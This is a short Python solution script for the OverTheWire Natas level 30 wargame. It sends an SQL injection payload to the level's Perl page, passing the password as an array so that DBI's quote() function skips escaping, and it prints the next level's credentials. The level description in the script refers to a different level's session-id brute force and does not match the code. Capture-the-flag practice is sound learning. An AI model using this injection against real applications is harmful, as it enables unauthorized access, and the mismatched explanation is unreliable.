import base64
import binascii
from tools import cryptotools
import requests
from requests.auth import HTTPBasicAuth
from secret.credentials import Credentials


def main():
    level = 30
    level_about = 'In this level you can see a sourcecode of vulnerable website, which is quite handy. We can see \n' \
                  'some messy code which seems to actually do nothing like logging in user. The interesting part \n' \
                  'is comment in the beginning of a code that says 640 $maxid should be enough. We need to execute \n' \
                  'print_credentials function with $_SESSION["admin"] set to 1. But there is no place in code \n' \
                  'where we  can set this to 1. We assume that there already is a session on the server with\n'\
                  'set $_SESSION["admin"] to 1. So we will try every of 640 possible session ids.'

    print("Hi there!\nyou've just run natas level " + str(level) +
          " (http://overthewire.org/wargames/natas/). Credentials are available in the secrets/credentials.py")

    print("\n" + level_about + "\n\n")

    # Real solution starts here :-)
    level_credentials = HTTPBasicAuth('natas' + str(level), Credentials.natas_credentials['natas' + str(level)])

    # We try to trick the perl DBI->quote function by supplying an array to it    $dbh->quote($value, $data_type);
    # we specify second array element as $data_type which will bypass any escaping
    parameters = {"username": "natas31", "password": ["'' or 1=1", 3]}
    r = requests.post("http://natas30.natas.labs.overthewire.org/index.pl", data=parameters, auth=level_credentials)
    print(r.text)



if __name__ == '__main__':
    main()
